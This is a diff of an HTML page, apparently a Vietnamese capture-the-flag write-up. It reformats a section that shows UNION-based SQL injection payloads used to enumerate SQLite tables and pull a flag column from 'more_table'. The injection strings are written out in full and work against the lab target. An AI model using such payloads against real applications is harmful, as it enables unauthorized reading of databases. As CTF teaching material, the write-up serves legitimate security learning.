@@ -124,21 +124,28 @@ Bước 4: Truy cập  <code>/admin</code> để lấy flag
 SQLI
 </h2><p><img src="https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda" alt="image"></p>
 <ul>
-<li>Lấy các bảng bằng payload như sau</li>
+<li>
+<p>Lấy các bảng bằng payload như sau</p>
+</li>
+<li>
+<p><code>a' union select 1,name,3 from sqlite_master where type='table'-- -</code></p>
+</li>
 </ul>
-<blockquote>
-<p>a&rsquo; union select 1,name,3 from sqlite_master where type=&lsquo;table&rsquo;&ndash; -</p></blockquote>
 <p><img src="https://github.com/user-attachments/assets/f0cc536a-7494-4c2b-99e5-4c918f7ac6ef" alt="image"></p>
 <ul>
-<li>Kiểm tra bảng more_table</li>
+<li>
+<p>Kiểm tra bảng more_table</p>
+</li>
+<li>
+<p><code>a' union select 1,sql,3 from sqlite_master where name='more_table'-- -</code></p>
+</li>
+<li>
+<p>KIểm tra cột flag trong bảng more_table</p>
+</li>
+<li>
+<p><code>a' union select flag,2,3 from more_table-- -</code></p>
+</li>
 </ul>
-<blockquote>
-<p>a&rsquo; union select 1,sql,3 from sqlite_master where name=&lsquo;more_table&rsquo;&ndash; -</p></blockquote>
-<ul>
-<li>KIểm tra cột flag trong bảng more_table</li>
-</ul>
-<blockquote>
-<p>a&rsquo; union select flag,2,3 from more_table&ndash; -</p></blockquote>
 <p><img src="https://github.com/user-attachments/assets/90e55f04-5245-4a7c-a5bf-c5ca3ee1a075" alt="image"></p>
 <h2 id="matchtheregex">
 <a class="header-anchor" href="#matchtheregex"></a>
